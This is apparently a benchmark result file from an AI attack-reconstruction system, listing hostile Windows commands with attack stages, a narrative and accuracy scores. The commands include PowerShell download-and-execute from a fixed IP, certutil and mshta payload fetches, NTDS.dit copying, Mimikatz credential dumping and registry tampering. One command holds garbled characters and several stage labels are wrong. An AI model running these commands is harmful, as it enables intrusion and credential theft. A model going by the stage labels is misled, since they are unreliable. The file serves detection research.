@@ -1,0 +1,176 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\u2705\u0696\u067e\u0686\u065f\u0627\u065c\u065f\u0631\u064e\u0651\u061f\u062a\u065c\u065f\u06af\u064e\u0651\u0631\u065c\u065f\u061a\u0650 \u2018\ub558\ub4dc\ub77c\ub978\uae30\ud574\ub958 \uc815\uc758\uace0 \ud560\uac70\ud574\ucc3d\uae30\ubd95\ub825\ub825\uae38\uba69\ucc45\uacac\ud559\ub825\ub825\uae30\ubd95\uae30\ud574\ub958 \uace0\uac1d\uacfc\ub85c \ud560\uac70\ud574\ucc3d\uae30\ubd95\ub825\ub825\uae38\uba69\ucc45\uacac\ud559\ub825\ub825\uae30\ubd95\uae30\ud574\ub958 \uace0\uac1d\uacfc\ub85c \ud560\uac70\ud574\ucc3d\uae30\ubd95\ub825\ub825\uae38\uba69\ucc45\uacac\ud559\ub825\ub825\uae30\ubd95\uae30\ud574\ub958 \uace0\uac1d\uacfc\ub85c \ud560\uac70\ud574\ucc3d\uae30\ubd95\ub825\ub825\uae38\uba69\ucc45\uacac\ud559\ub825\ub825\uae30\ubd95\uae30\ud574\ub958 \uace0\uac1d\uacfc\ub85c \ud560\uac70\ud574\ucc3d\uae30\ubd95\ub825\ub825\uae38\uba69\ucc45\uacac\ud559\ub825\ub825\uae30\ubd95\uae30\ud574\ub958 \uace0\uac1d\uacfc\ub85c \\B.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Discovery"
+      },
+      {
+        "command": "WMIC /node:\\\"localhost\\\" process call create \\\"cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1119 ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v \\\"verifierdlls \\\" /d \\\"1 \\\" /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg delete \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v \\\"verifierdlls\\\" /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /C certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.005  -TestNumbers 1",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest t1547.001 -TestNumbers 1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" /ve /d \\\"C:\\Windows\\System32\\cmd.exe\\\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C New-Item -Force -Path \\\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\\\" -Value 'cmd.exe /c notepad.exe'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003",
+        "stage": "Execution"
+      },
+      {
+        "command": "sangforcat.exe  -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C New-Item \\\"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\\\" -Force",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe  -decode a.txt b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=<DateTime>2020-10-10 12:12:12</DateTime>",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "netsh.exe interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Execution"
+      },
+      {
+        "command": "mimikatz2.exe   lsadump::sam exit",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers initially gained access to the system through certutil.exe downloading an executable. They then executed various PowerShell scripts to gather system information, disable Windows Firewall, escalate privileges, collect credentials and sensitive data, communicate with remote servers, move laterally, and execute further malicious actions. The attackers also attempted to evade detection by modifying registry settings and disabling logging mechanisms. Throughout the attack, they utilized various tools such as PowerShell, certutil.exe, MSHTA, SangForCat, Mimikatz, and custom-built executables to carry out their objectives.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 45038,
+      "completion_tokens": 5613,
+      "total_tokens": 50651,
+      "wall_clock_s": 222.996,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25806451612903225,
+      "recall": 0.5,
+      "f1": 0.3404255319148936,
+      "tp": 8,
+      "fp": 23,
+      "fn": 8
+    },
+    "stage": {
+      "precision": 0.06451612903225806,
+      "recall": 0.14285714285714285,
+      "f1": 0.08888888888888889,
+      "tp": 2,
+      "fp": 29,
+      "fn": 12,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 45038,
+      "completion_tokens": 5613,
+      "total_tokens": 50651,
+      "wall_clock_s": 222.996,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
